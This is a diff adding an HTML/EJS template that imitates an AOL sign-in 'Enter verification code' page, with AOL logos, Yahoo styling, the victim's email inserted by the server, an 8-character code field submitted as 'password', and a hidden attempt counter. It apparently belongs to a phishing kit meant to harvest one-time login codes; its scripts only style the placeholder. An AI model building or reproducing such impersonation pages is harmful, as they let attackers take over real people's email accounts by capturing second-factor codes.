@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+        integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+        crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
+        integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+        crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
+        integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+        crossorigin="anonymous"></script>
+    <title></title>
+    <style>
+        .aol-logo {
+            width: 100px;
+            position: relative;
+            background-color: #fff;
+            color: #26282a;
+            line-height: 84px;
+            padding-left: 43px;
+            top: 17px;
+        }
+
+        .aol-img {
+            width: 100px;
+            position: relative;
+            background-color: #fff;
+            color: #26282a;
+            line-height: 84px;
+
+            top: 17px;
+            display: block;
+            margin: 0 auto;
+            max-width: 90vw;
+        }
+
+        .text {
+            display: block;
+            letter-spacing: -.3px;
+            line-height: 60px;
+            text-align: center;
+            color: #26282a;
+            font-weight: 400;
+            font-family: 'Yahoo Sans', Arial;
+
+        }
+
+        .text2 {
+            display: block;
+            letter-spacing: -.3px;
+            text-align: center;
+            color: #26282a;
+            font-weight: 500;
+            font-family: 'Yahoo Sans', Arial;
+            margin-top: -15px;
+
+        }
+
+        .help {
+            top: 5%;
+            text-decoration: none;
+            color: #1476d9;
+            font-size: 13px;
+            right: 4%;
+            position: absolute;
+            transform: translateY(-50%);
+            font-family: 'Yahoo Sans', Arial;
+        }
+
+        .form1 {
+            box-sizing: border-box;
+            box-shadow: 0 2px 4px 0 rgba(0, 0, 0, .3);
+            width: 360px;
+            right: 23%;
+            min-height: 550px;
+            z-index: 1;
+            padding-top: 5px;
+            border-top-color: transparent;
+            border-top-style: solid;
+            border-top-width: 1px;
+            position: absolute;
+            top: 95px;
+        }
+
+        .signin {
+            display: block;
+            margin: 0;
+            margin-top: 0px;
+            margin-top: .82353rem;
+            font-size: 1.17647rem;
+            font-weight: 600;
+            letter-spacing: -.2px;
+            text-align: center;
+            line-height: 1.35294rem;
+            font-family: 'Yahoo Sans', Arial;
+        }
+
+        .form2 {
+            margin-left: -2px;
+            margin-top: 55px;
+        }
+
+        .resendcode {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .resendcode:hover {
+            text-decoration: none;
+            color: #1476d9;
+        }
+
+        .challenge-header {
+            margin-top: .94118rem;
+            min-height: 1rem;
+            display: inline-block;
+        }
+
+        .challenge-header2 {
+            margin-top: 0.941rem;
+            min-height: 1rem;
+            display: inline-block;
+        }
+
+
+        .input-container {
+            position: relative;
+            margin-bottom: 20px;
+            /* Adjust as needed */
+        }
+
+        .placeholder {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            left: 35px;
+            /* Adjust as needed */
+            color: #777;
+            /* Placeholder color */
+            pointer-events: none;
+            /* Allow clicking through the placeholder */
+            transition: transform 0.3s, font-size 0.3s;
+            font-size: 12px;
+        }
+
+        .input:focus+.placeholder,
+        .input:not(:placeholder-shown)+.placeholder {
+            transform: translateY(-90%) scale(0.8);
+            margin-top: -7px;
+            font-size: 12px;
+            /* Adjust as needed */
+        }
+
+        .input {
+            /* Your existing input styles here */
+            padding-left: 35px;
+            border: none;
+            border-bottom-color: currentcolor;
+            border-bottom-style: none;
+            border-bottom-width: medium;
+            font-family: 'Yahoo Sans', Arial;
+            border-bottom: .05882rem solid #b9bdc5;
+            width: 82%;
+            margin-left: 35px;
+            margin-top: .41176rem;
+            height: 1.88235rem;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .hidden-conatiner {
+            margin: -1px 0 0;
+            padding: 0;
+            height: 1px;
+            overflow: hidden;
+            visibility: hidden;
+        }
+
+        .button {
+            margin-left: 10%;
+            font-size: .94118rem;
+            font-weight: 500;
+            padding: 1rem 0;
+            line-height: 1rem;
+            border: none;
+            background: #39f;
+            margin-top: 20px;
+            width: 82%;
+            color: white;
+            border-radius: .11765rem;
+
+        }
+
+
+
+
+
+        @media only screen and (max-width: 1044px) {
+
+            .form1 {
+                box-sizing: border-box;
+                box-shadow: 0 2px 4px 0 rgba(0, 0, 0, .3);
+                width: 360px;
+                right: 7px;
+                min-height: 550px;
+                padding-top: 5px;
+                border-top-color: transparent;
+                border-top-style: solid;
+                border-top-width: 1px;
+                position: absolute;
+                top: 95px;
+                text-align: center;
+            }
+
+            .email-icon {
+                /* Style for the email icon */
+                position: absolute;
+                left: 53px;
+                /* Adjust the position as needed */
+                top: 65%;
+                /* Center vertically */
+                transform: translateY(-50%);
+                display: none;
+                /* Initially hide the icon */
+            }
+
+            .placeholder {
+                position: absolute;
+                top: 50%;
+                transform: translateY(-50%);
+                left: 52px;
+                /* Adjust as needed */
+                color: #777;
+                /* Placeholder color */
+                pointer-events: none;
+                /* Allow clicking through the placeholder */
+                transition: transform 0.3s, font-size 0.3s;
+                font-size: 12px;
+            }
+        }
+
+        @media only screen and (max-width: 760px) {
+
+            .placeholder {
+                position: absolute;
+                top: 50%;
+                transform: translateY(-50%);
+                left: 58px;
+                /* Adjust as needed */
+                color: #777;
+                /* Placeholder color */
+                pointer-events: none;
+                /* Allow clicking through the placeholder */
+                transition: transform 0.3s, font-size 0.3s;
+                font-size: 12px;
+            }
+
+            .form2 {
+                margin-left: -41px;
+            }
+        }
+
+
+        @media only screen and (max-width: 640px) {
+
+            .aol-img {
+                width: 80px;
+                padding-left: 20px;
+            }
+
+
+            .form1 {
+                box-sizing: border-box;
+                box-shadow: 0 2px 4px 0 rgba(0, 0, 0, .3);
+                width: 360px;
+                right: 140px;
+                min-height: 550px;
+                padding-top: 5px;
+                border-top-color: transparent;
+                border-top-style: solid;
+                border-top-width: 1px;
+                position: absolute;
+                top: 95px;
+                text-align: center;
+            }
+
+            .help {
+                top: 49px;
+                right: 77px;
+                font-size: 12px;
+            }
+
+            .signin {
+                margin: 10px;
+                font-size: 1.2rem;
+            }
+
+
+        }
+
+        @media only screen and (max-width: 480px) {
+            .aol-img {
+                width: 80px;
+                padding-left: 20px;
+            }
+
+
+            .placeholder {
+                position: absolute;
+                top: 35%;
+                transform: translateY(-50%);
+                left: 77px;
+                /* Adjust as needed */
+                color: #777;
+                /* Placeholder color */
+                pointer-events: none;
+                /* Allow clicking through the placeholder */
+                transition: transform 0.3s, font-size 0.3s;
+                font-size: 12px;
+            }
+
+
+
+            .aol-logo {
+                display: none;
+            }
+
+            .form1 {
+                box-sizing: border-box;
+                box-shadow: none;
+                /* Adjust these values */
+                width: 360px;
+                right: 42px;
+                min-height: 550px;
+                padding-top: 5px;
+                border-top-color: transparent;
+                border-top-style: solid;
+                border-top-width: 1px;
+                position: absolute;
+                top: 95px;
+                text-align: center;
+            }
+
+            .form2 {
+                margin-left: -30px;
+            }
+
+            .help {
+                display: none;
+            }
+
+            .signin {
+                margin: 10px;
+                font-size: 1.2rem;
+            }
+
+            .checkbox-container {
+                flex-direction: row;
+                align-items: flex-start;
+                display: flex;
+                flex-wrap: wrap;
+                margin-left: 20px;
+                margin-top: 20px;
+            }
+
+            .checkbox {
+                margin-top: 2px;
+                /* Adjust the margin as needed */
+            }
+
+            .resendcode {
+                display: block;
+                text-align: center;
+                margin-top: 20px;
+                margin-left: 30px;
+            }
+
+            .resendcode:hover {
+                text-decoration: none;
+                color: #1476d9;
+            }
+        }
+
+
+        @media only screen and (max-width: 396px) {
+            .aol-img {
+                width: 80px;
+                padding-left: 20px;
+            }
+
+            .aol-logo {
+                display: none;
+            }
+
+            .form1 {
+                box-sizing: border-box;
+                box-shadow: none;
+                /* Adjust these values */
+                width: 360px;
+                right: 17px;
+                min-height: 550px;
+                padding-top: 5px;
+                border-top-color: transparent;
+                border-top-style: solid;
+                border-top-width: 1px;
+                position: absolute;
+                top: 95px;
+                text-align: center;
+            }
+
+            .help {
+                display: none;
+            }
+
+            .signin {
+                margin: 10px;
+                font-size: 1.2rem;
+            }
+
+            .checkbox-container {
+                flex-direction: row;
+                align-items: flex-start;
+                display: flex;
+                flex-wrap: wrap;
+                margin-left: 20px;
+                margin-top: 20px;
+            }
+
+            .checkbox {
+                margin-top: 2px;
+                /* Adjust the margin as needed */
+            }
+
+            .button {
+                margin-left: 10%;
+                font-size: .94118rem;
+                font-weight: 500;
+                padding: 1rem 0;
+                line-height: 1rem;
+                border: none;
+                background: #39f;
+                margin-top: 20px;
+                width: 70%;
+                color: white;
+                border-radius: .11765rem;
+
+            }
+
+            .input {
+                /* Your existing input styles here */
+                padding-left: 35px;
+                border: none;
+                border-bottom-color: currentcolor;
+                border-bottom-style: none;
+                border-bottom-width: medium;
+                font-family: 'Yahoo Sans', Arial;
+                border-bottom: .05882rem solid #b9bdc5;
+                width: 70%;
+                margin-left: 35px;
+                margin-top: .41176rem;
+                height: 1.88235rem;
+                font-size: 14px;
+                outline: none;
+            }
+        }
+
+        @media only screen and (max-width: 374px) {
+            .aol-img {
+                width: 80px;
+                padding-left: 20px;
+            }
+
+            .aol-logo {
+                display: none;
+            }
+
+            .form1 {
+                box-sizing: border-box;
+                box-shadow: none;
+                /* Adjust these values */
+                width: 360px;
+                right: 5px;
+                min-height: 550px;
+                padding-top: 5px;
+                border-top-color: transparent;
+                border-top-style: solid;
+                border-top-width: 1px;
+                position: absolute;
+                top: 95px;
+                text-align: center;
+            }
+
+            .help {
+                display: none;
+            }
+
+            .signin {
+                margin: 10px;
+                font-size: 1.2rem;
+                margin-left: 34px;
+
+            }
+
+            .checkbox-container {
+                flex-direction: row;
+                align-items: flex-start;
+                display: flex;
+                flex-wrap: wrap;
+                margin-left: 20px;
+                margin-top: 20px;
+            }
+
+            .checkbox {
+                margin-top: 2px;
+                /* Adjust the margin as needed */
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header style="background-color: #fff;">
+        <img class="aol-logo" src="/aol-logo.png" alt="">
+        <a class="help" href="#">Help</a>
+    </header>
+
+
+    <div class="form1">
+        <img class="aol-img" src="/aol-logo.png" alt="">
+        <div class="challenge-header">
+        </div>
+        <strong class="signin "> <b>Enter verification code</b> </strong>
+        <strong class="text"> You'll get an email at </strong>
+        <strong class="text2"> <%= email %> </strong>
+        <div class="form2">
+            <form action="#" method="post">
+                <div class="input-container">
+                    <span class="placeholder">8 Character Code</span>
+                    <input class="input" id="doublePlaceholderInput" onfocus="setPlaceholder()"
+                        onblur="resetPlaceholder()" type="password" maxlength="8" name="password" required>
+
+                        <input type="number" id="count" name="count" value="<%= count %>" style="display: none;">
+
+                </div>
+
+                <input class="button" type="submit" value="Next">
+
+                <a class="resendcode" href="">resend code</a>
+                <a class="resendcode" href="">Try signing another way</a>
+            </form>
+        </div>
+    </div>
+
+
+
+
+
+
+</body>
+
+<script>
+    function setPlaceholder() {
+        document.getElementById('doublePlaceholderInput').placeholder = '--------';
+    }
+    function resetPlaceholder() {
+        document.getElementById('doublePlaceholderInput').placeholder = '';
+    }
+
+</script>
+
+<script>
+    // Add event listener to the input field for focus and blur events
+    document.getElementById('doublePlaceholderInput').addEventListener('focus', function () {
+        this.parentNode.querySelector('.placeholder').style.transform = 'translateY(-90%) scale(0.8)';
+        this.parentNode.querySelector('.placeholder').style.fontSize = '12px';
+    });
+
+    document.getElementById('doublePlaceholderInput').addEventListener('blur', function () {
+        if (this.value === '') {
+            this.parentNode.querySelector('.placeholder').style.transform = 'translateY(-50%)';
+            this.parentNode.querySelector('.placeholder').style.fontSize = '';
+            this.parentNode.querySelector('.placeholder').style.margintop = '12px';
+
+        }
+    });
+</script>
+
+</html>
